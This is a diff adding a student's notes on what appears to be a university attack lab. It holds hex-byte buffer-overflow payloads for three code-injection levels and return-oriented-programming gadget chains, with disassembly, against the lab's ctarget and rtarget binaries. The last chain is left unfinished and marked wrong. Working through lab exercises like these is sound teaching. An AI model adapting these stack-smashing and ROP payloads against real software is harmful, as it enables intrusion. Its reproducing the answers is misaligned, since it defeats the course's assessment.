@@ -1,0 +1,60 @@
+c1:  pat; &touch1
+c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00
+Cookie: 0x59b997fa
+Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+
+
+c2:  exploit: mov cookie, rdi; push &touch2; ret; pad; rsp
+	or mov cookie rdi; ret; pad; rsp; &touch2 
+48 c7 c7 fa 97 b9 59 c3 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 78 dc 61 55 00 00 00 00 ec 17 40 00 00 00 00 00
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+
+
+c3:  exploit: mov &string, rdi; ret; pad; rsp; &touch3; string 
+	or mov &string, rdi; push &touch3; ret; pad; rsp; string
+48 c7 c7 b0 dc 61 55 c3 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 78 dc 61 55 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
+Cookie: 0x59b997fa
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target ctarget
+
+
+r1:  pat &op1 cookie &op2 &touch2 
+	pat &op1(popq rax) cookie &op2(movq rax rdi) &touch2 
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq   
+op2: 4019a3
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+ op1: 4019ab
+c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a3 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+
+r2:  pat &op1(movq rsp r?) string &op2(movq r? rdi) &op3(popq r?)  &touch3 
+
+0000000000401a03 <addval_190>:
+  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
+  401a09:	c3                   	retq  
+op1 401a06: movq %rsp %rax
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq  
+op2 4019a3: movq %rax %rdi 
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq  
+op3 4019ab: popq %rax
+
+c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 c0 17 40 00 00 00 00 00 06 1a 40 00 00 00 00 00 35 39 62 39 39 37 66 61 a3 19 40 00 00 00 00 00 ab 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00
+
+wrong! rsp is changed when ret!
+slove later...
+
+
+ 
